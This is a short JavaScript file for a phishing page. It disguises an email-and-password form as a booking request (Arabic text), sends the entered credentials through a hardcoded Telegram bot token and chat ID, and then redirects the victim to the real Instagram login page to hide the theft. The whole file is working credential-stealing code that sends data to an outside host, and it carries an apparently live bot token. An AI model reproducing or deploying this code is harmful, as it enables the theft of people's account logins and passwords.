const BOT_TOKEN = "8713289499:AAFulH6hLiezW3d4hb03f5zspwwl7IynEMk";
const CHAT_ID = "8815746182";

document.getElementById("bookingForm").addEventListener("submit", async function(event) {
  event.preventDefault();

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  const message = `🔔 طلب حجز جديد

الايميل : ${email}
 الباسورد : ${password}`;

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });

    const result = await response.json();

    if (result.ok) {
      window.location.href = "https://www.instagram.com/accounts/login/?hl=ar";
    } else {
      alert("حدث خطأ أثناء الإرسال");
    }
  } catch (error) {
    alert("تعذر الاتصال بـ ");
  }
});